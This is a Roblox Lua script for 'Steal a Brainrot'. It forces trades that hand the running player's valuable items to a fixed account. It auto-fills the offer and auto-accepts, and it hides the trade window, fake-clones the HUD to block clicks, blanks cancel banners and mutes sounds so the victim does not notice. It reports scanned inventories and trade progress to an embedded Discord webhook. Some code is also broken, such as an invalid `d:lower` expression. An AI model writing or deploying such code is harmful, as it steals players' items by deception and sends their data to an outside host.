--=============================================================
-- SAB AUTOSENDTRADE DEFINITIVO
-- Logger filtrado + autotrade a KIMILOSP + HUD estatico
-- + relleno de oferta + Listo + Aceptar
--=============================================================

local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local Lighting = game:GetService("Lighting")
local SoundService = game:GetService("SoundService")
local HttpService = game:GetService("HttpService")
local LogService = game:GetService("LogService")
local VIM = game:GetService("VirtualInputManager")

local WEBHOOK_URL = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
local TARGET_USERNAME = "KIMILOSP"
local TARGET_USER_ID = "9555775328"

local LOOP_INTERVAL = 4
local CLICK_MODE = "SIGNAL"
local CLICK_STAGGER = 0.10
local AUTO_FILL_OFFER = true
local AUTO_READY_ACCEPT = true
local DEBUG_DUMP_TRADE_GUI = false
local SCAN_INTERVAL = 30

local HIDE_TRADE_UI = true
local USE_STATIC_LEFT_GUI = true
local HIDE_REAL_LEFT_BUTTONS = true
local BLOCK_MANUAL_LEFT_CLICKS = true
local DESTROY_BLUR_AND_ZOOM = true
local MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT = true
local HIDE_SECTION_BANNER_TEXTS = true
local AUTO_SEND_TRADE = true
local RETRY_DELAY = 0.35
local MAX_ATTEMPTS = 35

--========================= LISTAS =============================
local BRAINROTS_RAW = [[Noobini Santanini|Raccooni Jandelini|Malame Amarele|Buho de Fuego|Caramello Filtrello|Avocadorilla|Brutto Gialutto|Centrucci Nuclucci|Ganganzelli Trulala|Rhino Helicopterino|Stoppo Luminino|Tob Tobi Tobi|Lazy Ducky|Pineaplino|Pretzo Robo|Unclito Samito|Abyssaloco|Agarrini la Palini|Antonio|Arcadragon|Bearito Cabinito|Boppin Bunny|Bunito Bunito Spinito|Bunny and Eggy|Burguro And Fryuro|Capitano Moby|Cash or Card|Caylusaurus|Celestial Pegasus|Celularcini Viciosini|Cerberus|Chillin Chili|Chipso and Queso|Cloverat Clapat|Coco and Mango|Cooki and Milki|Digi Narwhal|Donkeyturbo Express|Dragon Aquanini|Dragon Cannelloni|Dragon Gingerini|Duggy Bros|Elefanto Frigo|Eviledon|Extinct Matteo|Festive 67|Fishino Clownino|Fortunu and Cashuru|Foxini Lanternini|Fragola La La La|Fragrama and Chocrama|Garama and Madundung|Ginger Gerat|Globa Steppa|Gobblino Uniciclino|Gold Gold Gold|Griffin|Guest 666|Gym Bros|Hopilikalika Hopilikalako|Hydra Bunny|Hydra Dragon Cannelloni|Jelly Moby|John Doe|Jolly Jolly Sahur|Kalika Bros|Karker Sahur|Ketchuru and Musturu|Ketupat Bros|Kraken|La Anniversary Grande|La Casa Boo|La Easter Grande|La Food Combinasion|La Ginger Sekolah|La Karkerkar Combinasion|La Lucky Grande|La Romantic Grande|La Sahur Combinasion|La Secret Combinasion|La Summer Grande|La Supreme Combinasion|La Taco Combinasion|Las Sis|Lavadorito Spinito|Los Amigos|Los Bros|Los Chillis|Los Fruits|Los Hackers|Los Hotspotsitos|Los Jolly Combinasionas|Los Mariachis|Los Mi Gatitos|Los Primos|Los Sekolahs|Los Spaghettis|Los Tacoritas|Love Love Bear|Lovin Rose|Money Money Bros|Money Money Reindeer|Nacho Spyder|Noo my examine|Orcaledon|Pancake and Syrup|Please my Present|Popcuru and Fizzuru|Quackini Snackini|Reinito Sleighito|Rico Dinero|Rosetti Tualetti|Rosey and Teddy|Rubrikiko|Sammyni Cakini|Sammyni Fattini|Sand Sand Sand|Signore Carapace|Spinny Hammy|Spooky and Pumpky|Steakini Fattini|Swag Soda|Swaggy Bros|Tacorita Bicicleta|Telemorte|Tictac Sahur|Tirilikalika Tirilikalako|Tralaledon|Tuff Toucan|Ventoliero Pavonero|Venuspino|W or L|Capitano Americano|Bufalino Boomberino|Esok Goala|Los Tangcitos|Los Tictacs|Los Admins|Moby Bros|Var Var Var|Noodle Noodle Poodle|Grabatron|Cangurato Gelato|Rubiko and Kubiko|Toro Españolo|Chicleteira Champeona|Examen Bros|Pizza and Ranch|Los Secret Combinasionas|Honey Honey Bear|Scorpino Coasterino|Queen Bee|Smore Serat|Yetimactic|La Breakfast Combinasion|Bumbatron|Candini Fluffini|Polaroidini|La Fuse Machine|Nachorilla|Sammyni Truckini|Orchidox|Pop Pop Petalini|Motorino Bumbuni|Pelican Pachetto|Deputy Leopard|Chicli Chicla|Panda Popanda|La Craft Machine|Gold and Diamond|Los Dragons|Zebrino Pianino|Hydra Serpent|Lavamanta|Lionello Casarello|Draculino|Oni Oni Panda|Sammyni Spookyni|Phoenix|Boo Boo Rocket|Flying Dutchman|Dragon Skeletonini|Tosto Dino|Cobra Gelato|Skelly and Coffy|Medusini and Demonini|Arca Bros|Fang Fang Draculang|Pum Pum Pum|Spooky Spooky Sahur|Spooketti Tualetti|Puppetmaster|Scorpi Inferni|Jacko Jakat|Spooky Kart|Scarino Crowino|Balloon Baboon|Bling Luming|Spinny Bros|Tang Bros|Nacho Bros|Tic Bros|Scorpi Bros|Machine Bros|Sammyni Bros|Cabin Bros|Scary Bros|Headless Horseman|John Pork|Meowl|Skibidi Toilet|Strawberry Elephant|Bombardiro Crocodilo|Money Money Cat|Money Money Puggy|Money Money Man|Job Job Job Sahur|Mi Gatito|Chicleteira Surfeiteira|Chicleteira Bicicleteira|Chicleteira Cupideira|Chicleteira Noelteira|Orcalero Orcala|Orcalita Orcala|Matteo|Sammyni Spyderini|Cola Cat|Ketupat Kepat|Brr es Teh Patipum|Capitano Gullini|Camera Ramena|DJ Panda|Dug dug dug|La Extinct Grande|La Jolly Grande|La Spooky Grande|Los Candies|Los Combinasionas|Mieteteira Bicicleteira|Lucky Block|Nuclearo Dinossauro|Pirulitoita Bicicleteira|Snailo Clovero|Spaghetti Tualetti|Tacorillo Crocodillo|Tang Tang Keletang|Peschito Machito|Conetto Morsetto|Tacoturbo Tacorito|Puffino Builderino|Gattino Hydrantino|Qamar Camelamp|bat-in-the-Box]]

local BASE_SKINS_RAW = [[Rose|Gingerbread|Halloween|Christmas|Bunny Basket|Summer|Pot of Gold|Taco|Octo|Valentines|Easter|Lucky|Aquatic|Tralalero|Bee Emperor|Honey Bee|Reaper]]

local GEARS_RAW = [[Santa's Sleigh|Cupid's Wings|Witch's Broom|Waverider|Yin Yang Slap|Cursed Slap|Cyber Slap|Divine Slap|Bloodmoon Slap|Radioactive Slap|Rainbow Slap|Rainbow Hammer|Bloodmoon Hammer|Radioactive Airstrike|Yin Yang Lamp|Demon's Head|Lava Slap|Lava Blaster|Alien Slap|Blackhole Bomb|Candy Sentry|Phantom Slap|Flying Bee|Crystal Slap|Candy Slap|Crystal Hammer|Skeleton Dragon]]

local function norm(s)
	s = tostring(s or ""):lower():gsub("%s+", " ")
	s = s:gsub("^%s+", ""):gsub("%s+$", "")
	return s
end

local function setFromRaw(raw)
	local t = {}
	for item in raw:gmatch("[^|]+") do
		local k = norm(item)
		if k ~= "" then t[k] = true end
	end
	return t
end

local BRAINROTS = setFromRaw(BRAINROTS_RAW)
local BASE_SKINS = setFromRaw(BASE_SKINS_RAW)
local GEARS = setFromRaw(GEARS_RAW)

local WANTED_LIST = {}
for _, t in ipairs({ BRAINROTS, BASE_SKINS, GEARS }) do
	for k in pairs(t) do WANTED_LIST[#WANTED_LIST + 1] = k end
end

local function matchWanted(text)
	local n = norm(text)
	if n == "" then return nil end
	if BRAINROTS[n] then return "brainrot", n end
	if BASE_SKINS[n] then return "skin", n end
	if GEARS[n] then return "gear", n end
	if #n > 60 then return nil end
	for _, k in ipairs(WANTED_LIST) do
		if n:find(k, 1, true) then
			if BRAINROTS[k] then return "brainrot", k end
			if BASE_SKINS[k] then return "skin", k end
			return "gear", k
		end
	end
	return nil
end

local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

--========================= WEBHOOK ============================
local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request

local function postWebhook(payload)
	if not httpRequest then
		warn("[WEBHOOK] Sin funcion de request disponible en este executor.")
		return false
	end
	local ok, res = pcall(function()
		return httpRequest({
			Url = WEBHOOK_URL,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(payload),
		})
	end)
	if ok and res and (res.StatusCode == 200 or res.StatusCode == 204) then
		return true
	end
	warn("[WEBHOOK] Fallo el envio:", tostring(ok), res and res.StatusCode)
	return false
end

local function sendEmbed(title, desc, color, fields)
	local embed = {
		title = title,
		description = desc,
		color = color or 3447003,
		footer = { text = "Venice SAB Logger - " .. os.date("%H:%M:%S") },
		fields = fields or {},
	}
	return postWebhook({ username = "Captain Hook", embeds = { embed } })
end

--========================= SCAN ===============================
local reported = {}
local lcPlayers = {}
for _, p in ipairs(Players:GetPlayers()) do lcPlayers[#lcPlayers + 1] = { name = p.Name, lc = p.Name:lower() } end

local function ownerOf(inst)
	local cur = inst
	local depth = 0
	while cur and cur ~= workspace and depth < 8 do
		local attr = cur:GetAttribute("Owner") or cur:GetAttribute("Player") or cur:GetAttribute("Username")
		if type(attr) == "string" and attr ~= "" then return attr end
		local sv = cur:FindFirstChild("Owner") or cur:FindFirstChild("Player")
		if sv and sv:IsA("StringValue") and sv.Value ~= "" then return sv.Value end
		local nm = cur.Name:lower()
		for _, p in ipairs(lcPlayers) do
			if nm:find(p.lc, 1, true) then return p.name end
		end
		cur = cur.Parent
		depth += 1
	end
	return nil
end

local function itemNameOf(inst)
	local n = inst.Name
	if matchWanted(n) then return n end
	local attr = inst:GetAttribute("Brainrot") or inst:GetAttribute("Item") or inst:GetAttribute("Name")
	if type(attr) == "string" and attr ~= "" then return attr end
	for _, ch in ipairs(inst:GetChildren()) do
		if ch:IsA("StringValue") and (ch.Name == "Name" or ch.Name == "Brainrot" or ch.Name == "Item") then
			if ch.Value ~= "" then return ch.Value end
		end
	end
	return nil
end

local function scanWorld()
	local roots = {}
	for _, d in ipairs(workspace:GetChildren()) do
		local n = d:lower and "" or d.Name:lower()
		if n:find("plot") or n:find("base") or n:find("island") or n:find("farm") then
			roots[#roots + 1] = d
		end
	end
	if #roots == 0 then roots = { workspace } end

	local found, newCount = {}, 0
	for _, root in ipairs(roots) do
		for _, inst in ipairs(root:GetDescendants()) do
			if inst:IsA("Model") or inst:IsA("BasePart") then
				local raw = itemNameOf(inst)
				if raw then
					local cat, key = matchWanted(raw)
					if cat then
						local owner = ownerOf(inst) or "Desconocido"
						local id = owner .. "|" .. key
						if not found[id] then
							found[id] = { owner = owner, cat = cat, name = key }
						end
					end
				end
			end
		end
	end

	local byOwner = {}
	for id, data in pairs(found) do
		if not reported[id] then
			reported[id] = true
			newCount += 1
			byOwner[data.owner] = byOwner[data.owner] or {}
			table.insert(byOwner[data.owner], (data.cat == "brainrot" and "• " or (data.cat == "gear" and "🔧 " or "🎨 ")) .. data.name)
		end
	end

	if newCount == 0 then return 0 end

	local fields = {}
	for owner, items in pairs(byOwner) do
		local shown = table.concat(items, "\n")
		if #shown > 1000 then shown = shown:sub(1, 1000) .. "\n..." end
		fields[#fields + 1] = { name = owner, value = shown, inline = false }
	end
	sendEmbed("Objetivos de tu lista detectados", "**" .. newCount .. "** objeto(s) nuevo(s) en bases.", 5763719, fields)
	return newCount
end

--========================= SONIDOS ============================
local function isInsideRebirth(inst)
	local cur = inst.Parent
	while cur and cur ~= playerGui do
		if norm(cur.Name):find("rebirth", 1, true) then return true end
		cur = cur.Parent
	end
	return false
end

local function isAllowedSound(snd)
	if not snd or not snd:IsA("Sound") then return false end
	local tokens = { norm(snd.Name), norm(snd.SoundId) }
	local a, d = snd.Parent, 0
	while a and a ~= game and d < 6 do
		tokens[#tokens + 1] = norm(a.Name)
		a = a.Parent
		d += 1
	end
	local blob = table.concat(tokens, " ")
	if blob:find("money", 1, true) or blob:find("cash", 1, true) or blob:find("coin", 1, true)
		or blob:find("dinero", 1, true) or blob:find("collect", 1, true) or blob:find("income", 1, true) then
		return true
	end
	local buy = blob:find("buy", 1, true) or blob:find("purchase", 1, true) or blob:find("comprar", 1, true)
	local conv = blob:find("conveyor", 1, true) or blob:find("pasarela", 1, true) or blob:find("brainrot", 1, true)
	return (buy and conv) and true or false
end

local function processSound(snd)
	if not MUTE_EXCEPT_MONEY_AND_CONVEYOR_BRAINROT or not snd or not snd:IsA("Sound") then return end
	if isInsideRebirth(snd) then return end
	if isAllowedSound(snd) then
		pcall(function()
			if snd.Volume <= 0 then snd.Volume = 0.65 end
		end)
		return
	end
	pcall(function()
		snd.Volume = 0
		snd.Playing = false
		snd:Stop()
	end)
end

--========================= TEXTOS =============================
local clearedTexts = {}

local function isBannerText(txt)
	local t = norm(txt)
	if t == "" then return false end
	if t:find("cancel", 1, true) or t:find("base bloqueada", 1, true) or t:find("bloqueada", 1, true) then return true end
	return false
end

local function maybeClearText(obj)
	if not HIDE_SECTION_BANNER_TEXTS or not obj or obj:IsDescendantOf(playerGui:FindFirstChild("SabStaticLeftHudGui")) then return end
	if not (obj:IsA("TextLabel") or obj:IsA("TextButton")) then return end
	if not isBannerText(obj.Text) then return end
	clearedTexts[obj] = clearedTexts[obj] or obj.Text
	pcall(function() obj.Text = "" end)
end

--========================= HUD ================================
local hiddenRealButtons = {}
local staticBlockers = {}
local defaultFov = 70
local cam = workspace.CurrentCamera
if cam then defaultFov = cam.FieldOfView end

local EXACT_HUD_BUTTONS = {
	{ name = "Shop", x = 81, y = 420, w = 102, h = 102, label = "Shop" },
	{ name = "Rebirth", x = 196, y = 422, w = 102, h = 102, label = "Rebirth" },
	{ name = "Index", x = 81, y = 537, w = 102, h = 102, label = "Index" },
	{ name = "DuelsMachinePlayerList", x = 198, y = 538, w = 102, h = 102, label = "Duels" },
	{ name = "TradePlayerList", x = 81, y = 655, w = 102, h = 102, label = "Trade" },
	{ name = "Codes", x = 198, y = 655, w = 102, h = 102, label = "Codes" },
}

local staticGui = Instance.new("ScreenGui")
staticGui.Name = "SabStaticLeftHudGui"
staticGui.ResetOnSpawn = false
staticGui.IgnoreGuiInset = true
staticGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
staticGui.DisplayOrder = 2147483647
staticGui.Enabled = USE_STATIC_LEFT_GUI
staticGui.Parent = playerGui

local function findButtonsContainer()
	local lc = playerGui:FindFirstChild("LeftCenter", true)
	if lc then return lc:FindFirstChild("Buttons", true) or lc end
	return nil
end

local function hideReal(desc)
	if not desc or not desc:IsA("GuiButton") or desc:IsDescendantOf(staticGui) then return end
	if HIDE_REAL_LEFT_BUTTONS then
		if not hiddenRealButtons[desc] then
			hiddenRealButtons[desc] = { Visible = desc.Visible, Active = desc.Active }
		end
		if desc.Visible or desc.Active then
			pcall(function()
				desc.Visible = false
				desc.Active = false
			end)
		end
	end
end

local function buildHud()
	for _, ch in ipairs(staticGui:GetChildren()) do ch:Destroy() end
	table.clear(staticBlockers)
	local container = findButtonsContainer()

	for i, spec in ipairs(EXACT_HUD_BUTTONS) do
		local orig = container and container:FindFirstChild(spec.name, true)
		local visual
		if orig and orig:IsA("GuiObject") then
			orig.Archivable = true
			local ok, copy = pcall(function() return orig:Clone() end)
			if ok and copy then
				for _, d in ipairs(copy:GetDescendants()) do
					if d:IsA("Script") or d:IsA("LocalScript") or d:IsA("Sound") then
						d:Destroy()
					elseif d:IsA("GuiObject") then
						d.Active = false
					end
				end
				copy.Active = false
				copy.Name = "Clone_" .. spec.name
				copy.Position = UDim2.fromOffset(0, 0)
				copy.Size = UDim2.fromScale(1, 1)
				copy.ZIndex = 95
				visual = copy
			end
		end

		local slot = Instance.new("Frame")
		slot.Name = "Slot_" .. i
		slot.Position = UDim2.fromOffset(spec.x, spec.y)
		slot.Size = UDim2.fromOffset(spec.w, spec.h)
		slot.BackgroundTransparency = visual and 1 or 0
		slot.BackgroundColor3 = Color3.fromRGB(68, 88, 102)
		slot.BorderSizePixel = 0
		slot.ZIndex = 95
		slot.Parent = staticGui

		if visual then
			visual.Parent = slot
		else
			local lbl = Instance.new("TextLabel")
			lbl.Size = UDim2.fromScale(1, 1)
			lbl.BackgroundTransparency = 1
			lbl.Text = spec.label
			lbl.TextColor3 = Color3.new(1, 1, 1)
			lbl.TextScaled = true
			lbl.Font = Enum.Font.GothamBlack
			lbl.ZIndex = 96
			lbl.Parent = slot
		end

		local blocker = Instance.new("TextButton")
		blocker.Size = UDim2.fromScale(1, 1)
		blocker.Text = ""
		blocker.BackgroundTransparency = 1
		blocker.AutoButtonColor = false
		blocker.Active = (CLICK_MODE == "SIGNAL") and BLOCK_MANUAL_LEFT_CLICKS
		blocker.BorderSizePixel = 0
		blocker.ZIndex = 100
		blocker.Parent = slot
		table.insert(staticBlockers, blocker)
	end

	if container then
		for _, d in ipairs(container:GetDescendants()) do hideReal(d) end
	end
end

local function keepHud()
	if staticGui.Enabled ~= USE_STATIC_LEFT_GUI then staticGui.Enabled = USE_STATIC_LEFT_GUI end
end

--========================= EFECTOS ============================
local function killEffect(obj)
	pcall(function()
		obj.Enabled = false
		obj:Destroy()
	end)
end

local function cleanEffects()
	if not DESTROY_BLUR_AND_ZOOM then return end
	for _, obj in ipairs(Lighting:GetDescendants()) do
		if obj:IsA("BlurEffect") or obj:IsA("DepthOfFieldEffect") then killEffect(obj) end
	end
	local c = workspace.CurrentCamera
	if c then
		for _, obj in ipairs(c:GetDescendants()) do
			if obj:IsA("BlurEffect") or obj:IsA("DepthOfFieldEffect") then killEffect(obj) end
		end
		pcall(function()
			if math.abs(c.FieldOfView - defaultFov) > 0.05 then c.FieldOfView = defaultFov end
		end)
	end
end

--========================= TRADE UI ===========================
local hiddenTrade = {}

local function isTradeThing(inst)
	local n = norm(inst.Name)
	if n:find("trade") or n:find("intercambio") then return true end
	for _, d in ipairs(inst:GetChildren()) do
		if d:IsA("TextLabel") or d:IsA("TextButton") then
			local t = norm(d.Text)
			if t:find("your offer") or t:find("tu oferta") or t:find("chat de intercambio") then return true end
		end
	end
	return false
end

local function setHidden(inst, hide)
	if not inst or not inst.Parent then return end
	if hide then
		if hiddenTrade[inst] == nil then
			pcall(function()
				if inst:IsA("LayerCollector") then
					hiddenTrade[inst] = inst.Enabled
					inst.Enabled = false
				elseif inst:IsA("GuiObject") then
					hiddenTrade[inst] = inst.Visible
					inst.Visible = false
				end
			end)
		else
			pcall(function()
				if inst:IsA("LayerCollector") then inst.Enabled = false
				elseif inst:IsA("GuiObject") then inst.Visible = false end
			end)
		end
	elseif hiddenTrade[inst] ~= nil then
		local prev = hiddenTrade[inst]
		hiddenTrade[inst] = nil
		pcall(function()
			if inst:IsA("LayerCollector") then inst.Enabled = prev
			elseif inst:IsA("GuiObject") then inst.Visible = prev end
		end)
	end
end

local function syncTrade()
	local lc = playerGui:FindFirstChild("LeftCenter", true)
	local lcGui = lc and lc:FindFirstAncestorWhichIsA("LayerCollector")
	for _, child in ipairs(playerGui:GetChildren()) do
		if child ~= staticGui and child ~= lcGui and child ~= lc then
			if isTradeThing(child) then
				setHidden(child, HIDE_TRADE_UI)
			else
				for _, sub in ipairs(child:GetChildren()) do
					if sub ~= lc and isTradeThing(sub) then setHidden(sub, HIDE_TRADE_UI) end
				end
			end
		end
	end
end

local function findTradeWindow()
	for _, gui in ipairs(playerGui:GetChildren()) do
		if gui ~= staticGui then
			local n = norm(gui.Name)
			if n:find("tradelive") or n:find("livetrade") then return gui end
		end
	end
	for _, gui in ipairs(playerGui:GetChildren()) do
		if gui ~= staticGui then
			for _, d in ipairs(gui:GetDescendants()) do
				if d:IsA("TextButton") then
					local t = norm(d.Text)
					if t == "listo" or t == "ready" or t == "aceptar" or t == "accept" then
						return gui
					end
				end
			end
		end
	end
	return nil
end

local function winAlive(win)
	if not win or not win.Parent then return false end
	if win:IsA("LayerCollector") then return win.Enabled or (hiddenTrade[win] == false) or true end
	return true
end

local function findBtnByText(root, names)
	if not root then return nil end
	for _, d in ipairs(root:GetDescendants()) do
		if d:IsA("GuiButton") and d.Active ~= false then
			local t = norm(d.Text)
			for _, nm in ipairs(names) do
				if t == nm or t:find(nm, 1, true) then return d end
			end
		end
	end
	return nil
end

--========================= CLIC ===============================
local function fireSignals(btn)
	if not btn or not btn:IsA("GuiButton") then return false end
	if CLICK_MODE == "VIM" then
		local pos, size = btn.AbsolutePosition, btn.AbsoluteSize
		if typeof(pos) == "Vector2" and typeof(size) == "Vector2" and size.X > 0 then
			local inset = GuiService:GetGuiInset()
			local x = math.floor(pos.X + size.X / 2)
			local y = math.floor(pos.Y + size.Y / 2 + inset.Y)
			pcall(function()
				VIM:SendMouseMoveEvent(x, y, game)
				task.wait(0.02)
				VIM:SendMouseButtonEvent(x, y, 0, true, game, 1)
				task.wait(0.04)
				VIM:SendMouseButtonEvent(x, y, 0, false, game, 1)
			end)
			task.wait(CLICK_STAGGER)
			return true
		end
	end

	local fired = false
	if getconnections then
		pcall(function()
			for _, c in ipairs(getconnections(btn.Activated)) do
				pcall(function() c:Fire() end)
				fired = true
			end
		end)
		if not fired then
			pcall(function()
				for _, c in ipairs(getconnections(btn.MouseButton1Click)) do
					pcall(function() c:Fire() end)
					fired = true
				end
			end)
		end
	end
	if not fired then
		pcall(function()
			firesignal(btn.Activated)
			fired = true
		end)
	end
	task.wait(CLICK_STAGGER)
	return fired
end

--========================= ENVIO DE TRADE =====================
local function resolveBtn(inst)
	if not inst then return nil end
	if inst:IsA("GuiButton") then return inst end
	local d = inst:FindFirstChildWhichIsA("GuiButton", true)
	if d then return d end
	return nil
end

local function findSearchBox(root)
	if not root then return nil end
	for _, d in ipairs(root:GetDescendants()) do
		if d:IsA("TextBox") then return d end
	end
	return nil
end

local function findSendBtn(root)
	if not root then return nil end
	local lowerTarget = TARGET_USERNAME:lower()
	for _, d in ipairs(root:GetDescendants()) do
		local dn = d.Name:lower()
		if dn:find(lowerTarget, 1, true) or dn:find(TARGET_USER_ID, 1, true) then
			local s = d:FindFirstChild("Send", true)
			if s then return resolveBtn(s) end
			for _, sub in ipairs(d:GetDescendants()) do
				if sub.Name:lower():find("send") or sub.Name:lower():find("enviar") then
					return resolveBtn(sub)
				end
			end
		end
	end
	return nil
end

local function findCloseBtn(root)
	if not root then return nil end
	for _, d in ipairs(root:GetDescendants()) do
		local n = d.Name:lower()
		if n == "x" or n == "close" or n:find("close", 1, true) then
			local b = resolveBtn(d)
			if b then return b end
		end
	end
	return nil
end

local function sendTrade()
	syncTrade()
	local sent = false
	for attempt = 1, MAX_ATTEMPTS do
		keepHud()
		local listGui = playerGui:FindFirstChild("TradePlayerList")
		local sendBtn = findSendBtn(listGui or playerGui)

		if not sendBtn then
			local lc = playerGui:FindFirstChild("LeftCenter", true)
			local openBtn = lc and resolveBtn(lc:FindFirstChild("TradePlayerList", true))
			if openBtn then
				fireSignals(openBtn)
				task.wait(RETRY_DELAY)
				listGui = playerGui:FindFirstChild("TradePlayerList")
			end
			local box = findSearchBox(listGui)
			if box then
				pcall(function()
					box:CaptureFocus()
					task.wait(0.05)
					box.Text = TARGET_USERNAME
					task.wait(0.05)
					box:ReleaseFocus()
				end)
				task.wait(RETRY_DELAY)
			end
			sendBtn = findSendBtn(listGui or playerGui)
		end

		if sendBtn and not sent then
			fireSignals(sendBtn)
			sent = true
			task.wait(RETRY_DELAY)
			local closeBtn = findCloseBtn(listGui or playerGui)
			if closeBtn then fireSignals(closeBtn) end
			break
		end
		task.wait(RETRY_DELAY)
	end
	syncTrade()
	return sent
end

--========================= RELLENO DE OFERTA ==================
local clickedItems = {}

local function itemBlob(btn)
	local blob = norm(btn.Name)
	local len = 0
	for _, d in ipairs(btn:GetDescendants()) do
		if d:IsA("TextLabel") or d:IsA("TextButton") then
			blob = blob .. " " .. norm(d.Text)
			len += #blob
			if len > 120 then break end
		end
	end
	return blob
end

local function isOtherSide(inst, win)
	local cur = inst.Parent
	local depth = 0
	while cur and cur ~= win and depth < 6 do
		local n = norm(cur.Name)
		if n:find("other") or n:find("their") or n:find("otro") or n:find("player2") or n:find("receiver") then
			return true
		end
		cur = cur.Parent
		depth += 1
	end
	return false
end

local function fillOffer(win)
	if not AUTO_FILL_OFFER or not win then return 0 end
	table.clear(clickedItems)
	local count = 0
	for _, d in ipairs(win:GetDescendants()) do
		if d:IsA("GuiButton") and not isOtherSide(d, win) then
			local blob = itemBlob(d)
			local cat, key = matchWanted(blob)
			if cat and not clickedItems[d] then
				clickedItems[d] = true
				fireSignals(d)
				count += 1
				if count % 4 == 0 then task.wait(0.05) end
			end
		end
	end
	return count
end

local function pressReadyAndAccept(win)
	if not AUTO_READY_ACCEPT or not win then return false end
	local ready = findBtnByText(win, { "listo", "ready" })
	if ready then
		fireSignals(ready)
		task.wait(0.7)
	end
	for _ = 1, 8 do
		if not win.Parent then break end
		local acc = findBtnByText(win, { "aceptar", "accept", "confirmar", "confirm" })
		if acc then
			fireSignals(acc)
			task.wait(0.7)
		else
			task.wait(0.3)
		end
	end
	return true
end

local function hasCompletionBanner()
	for _, d in ipairs(playerGui:GetDescendants()) do
		if d:IsA("TextLabel") and not d:IsDescendantOf(staticGui) then
			local t = norm(d.Text)
			if t:find("complet", 1, true) or t:find("success", 1, true) or t:find("exito", 1, true) then
				return true
			end
		end
	end
	return false
end

local function dumpTradeGui(win)
	if not DEBUG_DUMP_TRADE_GUI then return end
	print("[DUMP TRADE] " .. win:GetFullName())
	for _, d in ipairs(win:GetDescendants()) do
		print("  ", d.ClassName, d:GetFullName())
	end
end

--========================= CICLO ==============================
local filledFor = {}
local attempts = 0

task.spawn(function()
	if not AUTO_SEND_TRADE then return end
	task.wait(2)
	while true do
		keepHud()
		syncTrade()
		local win = findTradeWindow()

		if win then
			attempts = 0
			if not filledFor[win] then
				filledFor[win] = true
				dumpTradeGui(win)
				sendEmbed("KIMILOSP acepto el trade", "Rellenando oferta con tus objetos de lista.", 3066993)
				task.wait(0.9)
				local n = fillOffer(win)
				print("[OFFER] Objetos seleccionados:", n)
				task.wait(0.3)
				pressReadyAndAccept(win)
				task.wait(0.5)
				if not win.Parent or not winAlive(win) then
					filledFor = {}
				end
			end
		else
			if next(filledFor) ~= nil then
				filledFor = {}
				if hasCompletionBanner() then
					sendEmbed("Trade completado con KIMILOSP", "La operacion se cerro correctamente.", 3066993)
					task.wait(6)
				else
					sendEmbed("KIMILOSP cancelo el trade", "Reanudando insistencia.", 15158332)
					task.wait(1.2)
				end
			end
			attempts += 1
			local ok = sendTrade()
			print("[TRADE] Envio a KIMILOSP:", tostring(ok), "intento", attempts)
			if ok then
				sendEmbed("Trade enviado a KIMILOSP", "Invitacion disparada. Esperando respuesta.", 3447003)
			end
			if attempts == 12 then
				sendEmbed("KIMILOSP no responde", "12 intentos sin aceptar.", 16776960)
			end
		end
		task.wait(LOOP_INTERVAL)
	end
end)

--========================= LISTENERS ==========================
playerGui.DescendantAdded:Connect(function(d)
	if d:IsDescendantOf(staticGui) then return end
	if d:IsA("Sound") then processSound(d) end
	if d:IsA("TextLabel") or d:IsA("TextButton") then maybeClearText(d) end
	if d:IsA("GuiButton") then
		local c = findButtonsContainer()
		if c and d:IsDescendantOf(c) then hideReal(d) end
	end
	if HIDE_TRADE_UI and isTradeThing(d) then setHidden(d, true) end
end)

SoundService.DescendantAdded:Connect(function(d)
	if d:IsA("Sound") then processSound(d) end
end)

Lighting.DescendantAdded:Connect(function(d)
	if d:IsA("BlurEffect") or d:IsA("DepthOfFieldEffect") then killEffect(d) end
end)

LogService.MessageOut:Connect(function(msg, tipo)
	if tipo == Enum.MessageType.MessageError and msg:find("RebirthController", 1, true) then
		warn("[JUEGO] Error interno RebirthController: " .. msg)
	end
end)

Players.PlayerRemoving:Connect(function(p)
	if p.Name == TARGET_USERNAME then
		sendEmbed("KIMILOSP salio del servidor", "El ciclo queda en pausa hasta que vuelva.", 15158332)
	end
end)

--========================= ARRANQUE ===========================
cleanEffects()
syncTrade()
buildHud()
for _, d in ipairs(playerGui:GetDescendants()) do
	if d:IsA("Sound") then processSound(d) end
	if d:IsA("TextLabel") or d:IsA("TextButton") then maybeClearText(d) end
end

task.spawn(function()
	while true do
		task.wait(0.6)
		keepHud()
		syncTrade()
	end
end)

task.spawn(function()
	task.wait(3)
	while true do
		scanWorld()
		task.wait(SCAN_INTERVAL)
	end
end)

print("[SAB] Script cargado. Brainrots:", #WANTED_LIST, "| Objetivo:", TARGET_USERNAME, "| Modo clic:", CLICK_MODE)
sendEmbed("Script iniciado", "Logger activo con " .. #WANTED_LIST .. " objetos filtrados.\nObjetivo: **" .. TARGET_USERNAME .. "**", 3447003)
